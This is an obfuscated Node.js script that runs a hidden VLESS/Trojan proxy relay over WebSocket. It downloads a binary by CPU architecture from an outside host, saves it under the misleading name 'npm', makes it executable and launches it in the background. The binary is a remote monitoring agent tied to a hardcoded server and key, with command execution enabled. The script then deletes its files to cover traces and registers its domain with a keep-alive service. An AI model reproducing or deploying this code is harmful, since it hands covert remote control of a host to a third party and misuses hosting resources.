const _0x515676=_0x4d1d;(function(_0x40ecb8,_0x5e34be){const _0x2ecdf2=_0x4d1d,_0x46f257=_0x40ecb8();while(!![]){try{const _0x378048=parseInt(_0x2ecdf2(0x14f))/0x1*(-parseInt(_0x2ecdf2(0x135))/0x2)+-parseInt(_0x2ecdf2(0x146))/0x3*(parseInt(_0x2ecdf2(0x141))/0x4)+-parseInt(_0x2ecdf2(0x123))/0x5*(parseInt(_0x2ecdf2(0x195))/0x6)+-parseInt(_0x2ecdf2(0x125))/0x7*(-parseInt(_0x2ecdf2(0x161))/0x8)+parseInt(_0x2ecdf2(0x152))/0x9*(-parseInt(_0x2ecdf2(0x136))/0xa)+parseInt(_0x2ecdf2(0x18f))/0xb+parseInt(_0x2ecdf2(0x196))/0xc;if(_0x378048===_0x5e34be)break;else _0x46f257['push'](_0x46f257['shift']());}catch(_0x62680e){_0x46f257['push'](_0x46f257['shift']());}}}(_0x3ae9,0x67e00));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x515676(0x160)),net=require(_0x515676(0x17e)),path=require(_0x515676(0x159)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x515676(0x14c)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x515676(0x143)]['UUID']||_0x515676(0x14a),NEZHA_SERVER=process[_0x515676(0x143)]['NEZHA_SERVER']||'grpc.lchyc.com:80',NEZHA_PORT=process[_0x515676(0x143)][_0x515676(0x187)]||'',NEZHA_KEY=process[_0x515676(0x143)][_0x515676(0x199)]||'ZUf8CCwIgss6r4yrtCvvEz0MD23exwHc',DOMAIN=process[_0x515676(0x143)]['DOMAIN']||_0x515676(0x12b),AUTO_ACCESS=process[_0x515676(0x143)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x515676(0x133)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x515676(0x15f)]||_0x515676(0x129),NAME=process['env'][_0x515676(0x155)]||'hyc',PORT=process[_0x515676(0x143)][_0x515676(0x184)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x595fcd=_0x515676;try{const _0x83d2ee=await axios[_0x595fcd(0x18a)]('https://speed.cloudflare.com/meta'),_0x45045b=_0x83d2ee[_0x595fcd(0x17d)];ISP=(_0x45045b[_0x595fcd(0x13d)]+'-'+_0x45045b[_0x595fcd(0x13e)])[_0x595fcd(0x12e)](/ /g,'_');}catch(_0x1d7384){ISP=_0x595fcd(0x126);}};function _0x4d1d(_0x75ea1f,_0x316b82){_0x75ea1f=_0x75ea1f-0x123;const _0x3ae92e=_0x3ae9();let _0x4d1d39=_0x3ae92e[_0x75ea1f];return _0x4d1d39;}GetISP();function _0x3ae9(){const _0x40cf99=['reduce','text/plain','includes','https://arm64.ssss.nyc.mn/agent','readFile','end','country','asOrganization','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x20-p\x20','135528LNxhFW','\x20with\x20all\x20DNS\x20servers','env','&fp=chrome&type=ws&host=','false','6nqxVdU','write','chmod\x20+x\x20npm','pipe','3e60eb17-c063-4605-be5b-d91605fcf679','catch','child_process','stream','send','16610pZkStk','error:\x20','8443','333LmAeRa',':443?security=tls&sni=','Server','NAME','substr','1.1.1.1','find','path','index.html','2083','split','https://arm64.ssss.nyc.mn/v1','application/dns-json','SUB_PATH','axios','191272WgltzI','trojan://','test','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','arm','8.8.4.4','https://','join','log','slice','then','Automatic\x20Access\x20Task\x20added\x20successfully','connect','&path=%2F','https://dns.google/resolve?name=','readUInt16BE','url','arch','setsid\x20nohup\x20./npm\x20-s\x20','trim','digest','update','npm\x20is\x20already\x20running,\x20skip\x20running...','text/html','Status','Server\x20is\x20running\x20on\x20port\x20','writeHead','once','data','net','npm','close','client_secret:\x20','utf8','https://oooo.serv00.net/add-url','PORT','from','--tls','NEZHA_PORT','post','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','get',':443?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/agent','toString','config.yaml','7148130YasceD','finish','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','map','concat','createServer','750jhmJBi','3184452lzDjXk','hex','length','NEZHA_KEY','Answer','https://amd64.ssss.nyc.mn/v1','1040Mthtmk','every','224aztXZf','Unknown','unlink','readUInt8','hyc','utf-8','1234.abc.com','listen','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','replace','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','sha224','error','2096','WSPATH','Failed\x20to\x20resolve\x20','54bzzgtA','192590dVODUD'];_0x3ae9=function(){return _0x40cf99;};return _0x3ae9();}const httpServer=http[_0x515676(0x194)]((_0x4a7a8b,_0x27683c)=>{const _0x3d6bbd=_0x515676;if(_0x4a7a8b[_0x3d6bbd(0x171)]==='/'){const _0x191fee=path['join'](__dirname,_0x3d6bbd(0x15a));fs[_0x3d6bbd(0x13b)](_0x191fee,_0x3d6bbd(0x182),(_0xe2ac0d,_0x23f556)=>{const _0x335729=_0x3d6bbd;if(_0xe2ac0d){_0x27683c[_0x335729(0x17b)](0xc8,{'Content-Type':_0x335729(0x178)}),_0x27683c[_0x335729(0x13c)]('Hello\x20world!');return;}_0x27683c[_0x335729(0x17b)](0xc8,{'Content-Type':_0x335729(0x178)}),_0x27683c[_0x335729(0x13c)](_0x23f556);});return;}else{if(_0x4a7a8b[_0x3d6bbd(0x171)]==='/'+SUB_PATH){const _0x2b5215='vless://'+UUID+'@'+DOMAIN+_0x3d6bbd(0x18b)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3d6bbd(0x16e)+WSPATH+'#'+NAME+'-'+ISP,_0x5b9e39=_0x3d6bbd(0x162)+UUID+'@'+DOMAIN+_0x3d6bbd(0x153)+DOMAIN+_0x3d6bbd(0x144)+DOMAIN+_0x3d6bbd(0x16e)+WSPATH+'#'+NAME+'-'+ISP,_0x46a329=_0x2b5215+'\x0a'+_0x5b9e39,_0x1e0dfd=Buffer[_0x3d6bbd(0x185)](_0x46a329)[_0x3d6bbd(0x18d)]('base64');_0x27683c[_0x3d6bbd(0x17b)](0xc8,{'Content-Type':'text/plain'}),_0x27683c[_0x3d6bbd(0x13c)](_0x1e0dfd+'\x0a');}else _0x27683c[_0x3d6bbd(0x17b)](0x194,{'Content-Type':_0x3d6bbd(0x138)}),_0x27683c[_0x3d6bbd(0x13c)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x515676(0x154))]({'server':httpServer}),uuid=UUID[_0x515676(0x12e)](/-/g,''),DNS_SERVERS=[_0x515676(0x166),_0x515676(0x157)];function resolveHost(_0x5b6222){return new Promise((_0x2ce9a0,_0xfb9821)=>{const _0x1d1ec4=_0x4d1d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1d1ec4(0x163)](_0x5b6222)){_0x2ce9a0(_0x5b6222);return;}let _0x38fe14=0x0;function _0x543986(){const _0x13889d=_0x1d1ec4;if(_0x38fe14>=DNS_SERVERS[_0x13889d(0x198)]){_0xfb9821(new Error(_0x13889d(0x134)+_0x5b6222+_0x13889d(0x142)));return;}const _0x42c38f=DNS_SERVERS[_0x38fe14];_0x38fe14++;const _0x1a5423=_0x13889d(0x16f)+encodeURIComponent(_0x5b6222)+'&type=A';axios[_0x13889d(0x18a)](_0x1a5423,{'timeout':0x1388,'headers':{'Accept':_0x13889d(0x15e)}})[_0x13889d(0x16b)](_0x2272c5=>{const _0x2a4cdd=_0x13889d,_0x15ed54=_0x2272c5[_0x2a4cdd(0x17d)];if(_0x15ed54[_0x2a4cdd(0x179)]===0x0&&_0x15ed54[_0x2a4cdd(0x19a)]&&_0x15ed54[_0x2a4cdd(0x19a)]['length']>0x0){const _0x37719e=_0x15ed54[_0x2a4cdd(0x19a)][_0x2a4cdd(0x158)](_0x367473=>_0x367473['type']===0x1);if(_0x37719e){_0x2ce9a0(_0x37719e[_0x2a4cdd(0x17d)]);return;}}_0x543986();})[_0x13889d(0x14b)](_0x11fb7c=>{_0x543986();});}_0x543986();});}function handleVlessConnection(_0x4e2bb0,_0x5d9494){const _0x64f608=_0x515676,[_0x4dd39a]=_0x5d9494,_0x2b3dec=_0x5d9494[_0x64f608(0x16a)](0x1,0x11);if(!_0x2b3dec[_0x64f608(0x124)]((_0x525bad,_0x56fd21)=>_0x525bad==parseInt(uuid[_0x64f608(0x156)](_0x56fd21*0x2,0x2),0x10)))return![];let _0x2d1b84=_0x5d9494[_0x64f608(0x16a)](0x11,0x12)[_0x64f608(0x128)]()+0x13;const _0x387736=_0x5d9494[_0x64f608(0x16a)](_0x2d1b84,_0x2d1b84+=0x2)[_0x64f608(0x170)](0x0),_0x11256e=_0x5d9494['slice'](_0x2d1b84,_0x2d1b84+=0x1)[_0x64f608(0x128)](),_0xe1685e=_0x11256e==0x1?_0x5d9494[_0x64f608(0x16a)](_0x2d1b84,_0x2d1b84+=0x4)[_0x64f608(0x168)]('.'):_0x11256e==0x2?new TextDecoder()['decode'](_0x5d9494[_0x64f608(0x16a)](_0x2d1b84+0x1,_0x2d1b84+=0x1+_0x5d9494[_0x64f608(0x16a)](_0x2d1b84,_0x2d1b84+0x1)[_0x64f608(0x128)]())):_0x11256e==0x3?_0x5d9494[_0x64f608(0x16a)](_0x2d1b84,_0x2d1b84+=0x10)['reduce']((_0x37007a,_0x337630,_0x57185f,_0x1695c3)=>_0x57185f%0x2?_0x37007a[_0x64f608(0x193)](_0x1695c3[_0x64f608(0x16a)](_0x57185f-0x1,_0x57185f+0x1)):_0x37007a,[])[_0x64f608(0x192)](_0x1e82fb=>_0x1e82fb[_0x64f608(0x170)](0x0)['toString'](0x10))['join'](':'):'';_0x4e2bb0[_0x64f608(0x14e)](new Uint8Array([_0x4dd39a,0x0]));const _0x2734d7=createWebSocketStream(_0x4e2bb0);return resolveHost(_0xe1685e)[_0x64f608(0x16b)](_0x5d1c57=>{const _0x11e499=_0x64f608;net['connect']({'host':_0x5d1c57,'port':_0x387736},function(){const _0xfc9d17=_0x4d1d;this[_0xfc9d17(0x147)](_0x5d9494[_0xfc9d17(0x16a)](_0x2d1b84)),_0x2734d7['on'](_0xfc9d17(0x131),()=>{})[_0xfc9d17(0x149)](this)['on'](_0xfc9d17(0x131),()=>{})[_0xfc9d17(0x149)](_0x2734d7);})['on'](_0x11e499(0x131),()=>{});})[_0x64f608(0x14b)](_0x1e825e=>{const _0x395578=_0x64f608;net['connect']({'host':_0xe1685e,'port':_0x387736},function(){const _0x5b26ea=_0x4d1d;this[_0x5b26ea(0x147)](_0x5d9494['slice'](_0x2d1b84)),_0x2734d7['on']('error',()=>{})[_0x5b26ea(0x149)](this)['on'](_0x5b26ea(0x131),()=>{})[_0x5b26ea(0x149)](_0x2734d7);})['on'](_0x395578(0x131),()=>{});}),!![];}function handleTrojanConnection(_0x275bb0,_0x43b297){const _0x27b141=_0x515676;try{if(_0x43b297['length']<0x3a)return![];const _0x56e5b8=_0x43b297[_0x27b141(0x16a)](0x0,0x38)[_0x27b141(0x18d)](),_0x294bdc=[UUID];let _0x30d060=null;for(const _0xb0c21a of _0x294bdc){const _0x782c91=crypto['createHash'](_0x27b141(0x130))[_0x27b141(0x176)](_0xb0c21a)[_0x27b141(0x175)](_0x27b141(0x197));if(_0x782c91===_0x56e5b8){_0x30d060=_0xb0c21a;break;}}if(!_0x30d060)return![];let _0x53a2a0=0x38;_0x43b297[_0x53a2a0]===0xd&&_0x43b297[_0x53a2a0+0x1]===0xa&&(_0x53a2a0+=0x2);const _0x3c65c9=_0x43b297[_0x53a2a0];if(_0x3c65c9!==0x1)return![];_0x53a2a0+=0x1;const _0x56117b=_0x43b297[_0x53a2a0];_0x53a2a0+=0x1;let _0x49759c,_0x535cd5;if(_0x56117b===0x1)_0x49759c=_0x43b297[_0x27b141(0x16a)](_0x53a2a0,_0x53a2a0+0x4)[_0x27b141(0x168)]('.'),_0x53a2a0+=0x4;else{if(_0x56117b===0x3){const _0x139641=_0x43b297[_0x53a2a0];_0x53a2a0+=0x1,_0x49759c=_0x43b297[_0x27b141(0x16a)](_0x53a2a0,_0x53a2a0+_0x139641)[_0x27b141(0x18d)](),_0x53a2a0+=_0x139641;}else{if(_0x56117b===0x4)_0x49759c=_0x43b297['slice'](_0x53a2a0,_0x53a2a0+0x10)[_0x27b141(0x137)]((_0x5eac02,_0x2c4de4,_0x49e2bb,_0x297496)=>_0x49e2bb%0x2?_0x5eac02[_0x27b141(0x193)](_0x297496[_0x27b141(0x16a)](_0x49e2bb-0x1,_0x49e2bb+0x1)):_0x5eac02,[])[_0x27b141(0x192)](_0x1e2fe2=>_0x1e2fe2[_0x27b141(0x170)](0x0)['toString'](0x10))['join'](':'),_0x53a2a0+=0x10;else return![];}}_0x535cd5=_0x43b297[_0x27b141(0x170)](_0x53a2a0),_0x53a2a0+=0x2;_0x53a2a0<_0x43b297[_0x27b141(0x198)]&&_0x43b297[_0x53a2a0]===0xd&&_0x43b297[_0x53a2a0+0x1]===0xa&&(_0x53a2a0+=0x2);const _0x2248bd=createWebSocketStream(_0x275bb0);return resolveHost(_0x49759c)[_0x27b141(0x16b)](_0x348967=>{const _0x4f84dc=_0x27b141;net[_0x4f84dc(0x16d)]({'host':_0x348967,'port':_0x535cd5},function(){const _0x3b8acb=_0x4f84dc;_0x53a2a0<_0x43b297[_0x3b8acb(0x198)]&&this[_0x3b8acb(0x147)](_0x43b297[_0x3b8acb(0x16a)](_0x53a2a0)),_0x2248bd['on'](_0x3b8acb(0x131),()=>{})[_0x3b8acb(0x149)](this)['on']('error',()=>{})[_0x3b8acb(0x149)](_0x2248bd);})['on'](_0x4f84dc(0x131),()=>{});})[_0x27b141(0x14b)](_0x5285b8=>{net['connect']({'host':_0x49759c,'port':_0x535cd5},function(){const _0x41cbf2=_0x4d1d;_0x53a2a0<_0x43b297['length']&&this['write'](_0x43b297[_0x41cbf2(0x16a)](_0x53a2a0)),_0x2248bd['on']('error',()=>{})[_0x41cbf2(0x149)](this)['on'](_0x41cbf2(0x131),()=>{})[_0x41cbf2(0x149)](_0x2248bd);})['on']('error',()=>{});}),!![];}catch(_0x1ec7b3){return![];}}wss['on']('connection',(_0x5bf74a,_0x283d20)=>{const _0x55a7cb=_0x515676,_0x3e8294=_0x283d20[_0x55a7cb(0x171)]||'';_0x5bf74a[_0x55a7cb(0x17c)]('message',_0x4fc0b5=>{const _0x2de580=_0x55a7cb;if(_0x4fc0b5[_0x2de580(0x198)]>0x11&&_0x4fc0b5[0x0]===0x0){const _0x188628=_0x4fc0b5['slice'](0x1,0x11),_0x5c28a3=_0x188628['every']((_0x9b732b,_0x1b9fba)=>_0x9b732b==parseInt(uuid['substr'](_0x1b9fba*0x2,0x2),0x10));if(_0x5c28a3){!handleVlessConnection(_0x5bf74a,_0x4fc0b5)&&_0x5bf74a[_0x2de580(0x180)]();return;}}!handleTrojanConnection(_0x5bf74a,_0x4fc0b5)&&_0x5bf74a[_0x2de580(0x180)]();})['on'](_0x55a7cb(0x131),()=>{});});const getDownloadUrl=()=>{const _0x488c3b=_0x515676,_0x463327=os[_0x488c3b(0x172)]();return _0x463327===_0x488c3b(0x165)||_0x463327==='arm64'||_0x463327==='aarch64'?!NEZHA_PORT?_0x488c3b(0x15d):_0x488c3b(0x13a):!NEZHA_PORT?_0x488c3b(0x19b):_0x488c3b(0x18c);},downloadFile=async()=>{const _0x330e0a=_0x515676;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4e92dd=getDownloadUrl(),_0x492188=await axios({'method':'get','url':_0x4e92dd,'responseType':_0x330e0a(0x14d)}),_0x20cefd=fs['createWriteStream'](_0x330e0a(0x17f));return _0x492188[_0x330e0a(0x17d)][_0x330e0a(0x149)](_0x20cefd),new Promise((_0x2b2eb5,_0x46ae42)=>{const _0xfd0298=_0x330e0a;_0x20cefd['on'](_0xfd0298(0x190),()=>{const _0x1b5bbe=_0xfd0298;console[_0x1b5bbe(0x169)]('npm\x20download\x20successfully'),exec(_0x1b5bbe(0x148),_0x3b0b9a=>{if(_0x3b0b9a)_0x46ae42(_0x3b0b9a);_0x2b2eb5();});}),_0x20cefd['on'](_0xfd0298(0x131),_0x46ae42);});}catch(_0x322bc4){throw _0x322bc4;}},runnz=async()=>{const _0x4180a0=_0x515676;try{const _0x13a26e=execSync(_0x4180a0(0x12f),{'encoding':_0x4180a0(0x12a)});if(_0x13a26e[_0x4180a0(0x174)]()!==''){console[_0x4180a0(0x169)](_0x4180a0(0x177));return;}}catch(_0x41eec0){}await downloadFile();let _0x1d113b='',_0x1a38cc=['443',_0x4180a0(0x151),_0x4180a0(0x132),'2087',_0x4180a0(0x15b),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x528350=_0x1a38cc[_0x4180a0(0x139)](NEZHA_PORT)?_0x4180a0(0x186):'';_0x1d113b=_0x4180a0(0x173)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4180a0(0x140)+NEZHA_KEY+'\x20'+_0x528350+_0x4180a0(0x189);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2a1898=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4180a0(0x15c)](':')['pop']():'',_0x194ae5=_0x1a38cc[_0x4180a0(0x139)](_0x2a1898)?'true':_0x4180a0(0x145),_0x5df3ae=_0x4180a0(0x181)+NEZHA_KEY+_0x4180a0(0x191)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x194ae5+_0x4180a0(0x12d)+UUID;fs['writeFileSync'](_0x4180a0(0x18e),_0x5df3ae);}_0x1d113b=_0x4180a0(0x164);}else{console[_0x4180a0(0x169)](_0x4180a0(0x13f));return;}}try{exec(_0x1d113b,{'shell':'/bin/bash'},_0x5c883d=>{const _0x7dda18=_0x4180a0;if(_0x5c883d)console['error']('npm\x20running\x20error:',_0x5c883d);else console[_0x7dda18(0x169)]('npm\x20is\x20running');});}catch(_0x26f478){console['error'](_0x4180a0(0x150)+_0x26f478);}};async function addAccessTask(){const _0x4d7e68=_0x515676;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1cb715=_0x4d7e68(0x167)+DOMAIN;try{const _0x141377=await axios[_0x4d7e68(0x188)](_0x4d7e68(0x183),{'url':_0x1cb715},{'headers':{'Content-Type':'application/json'}});console[_0x4d7e68(0x169)](_0x4d7e68(0x16c));}catch(_0x483f2f){}}const delFiles=()=>{const _0x321279=_0x515676;fs[_0x321279(0x127)]('npm',()=>{}),fs[_0x321279(0x127)](_0x321279(0x18e),()=>{});};httpServer[_0x515676(0x12c)](PORT,()=>{const _0xbb2fc0=_0x515676;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xbb2fc0(0x169)](_0xbb2fc0(0x17a)+PORT);});
